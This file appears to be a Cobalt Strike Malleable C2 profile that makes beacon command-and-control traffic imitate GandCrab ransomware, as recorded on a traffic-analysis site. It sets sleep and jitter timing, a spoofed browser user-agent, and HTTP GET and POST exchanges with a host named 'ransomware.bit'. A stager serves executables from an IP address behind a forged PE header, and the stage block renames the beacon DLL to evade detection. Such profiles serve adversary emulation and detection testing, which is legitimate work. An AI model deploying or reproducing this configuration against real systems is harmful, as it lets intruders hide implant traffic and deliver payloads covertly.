#gandcrab ransomware
#taken from - https://www.malware-traffic-analysis.net/2018/04/10/index.html 
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/";
    
    client {

        header "Host" "ransomware.bit";
        header "Cache-Control" "no-cache";
	
        
        metadata {
            base64url;
            header "Cookie";


        }


    }

    server {
#yes, the server header is really blank...
        header "Server" " ";
	header "Cache-Control" "private";
	header "Content-Type" "text/html";
	header "Connection" "close";
        

        output {
            netbios;
	    prepend "               ";
	    prepend "               ";
	    prepend "173.166.146.112";
            print;
        }
    }
}

http-post {
    
    set uri "/feascui";

    client {
       
	header "Host" "ransomware.bit";
        header "Content-Type" "application/x-www-form-urlencoded";
	header "Cache-Control" "no-cache";
        
        output {
            base64;
	    print;

        }
             
        id {
            base64url;
	    parameter "ssey";


        }
    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/html; charset=UTF-8";
	header "Connection" "close";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/da.exe";
	set uri_x64 "/DA.exe";

    client {
	header "Host" "185.189.58.222";
	header "Connection" "Keep-Alive";
    }

    server {
	header "Server" "Apache/2.2.15 (CentOS)";
        header "ETag" "1807d1-49808-5697d14752010";
	header "Accept-Ranges" "bytes";
        header "Connection" "close";
	header "Content-Type" "application/octet-stream";

	output {
	    prepend "MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.

$.........S...=...=...=.......=.......=.......=.......=...<...=.......=.......=.......=.......=.Rich..=.........................PE..L....[.Z..............
......f....................@..........................`......Wa..........................................x........)..............................................................@............................................text... ........................... ..`.rdata..J<.......>..................@..@.data...............................@....rsrc....).......*..................@..@.reloc...X.......Z...>..............@..B........................................................................................................................................................................................................................................................................................................................................U...E.....\\$..E...$......].....E.]...%..A..%H.A..%..A..%..A..%..A..%..A.";
	    print;
	}
    
    }


}

stage {
	set compile_time "11 Nov 2010 23:29:33";
	set image_size_x86 "301064";

	transform-x86 {
		strrep "beacon.dll" "bKKc.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "bKKc.dll";
	}	



}
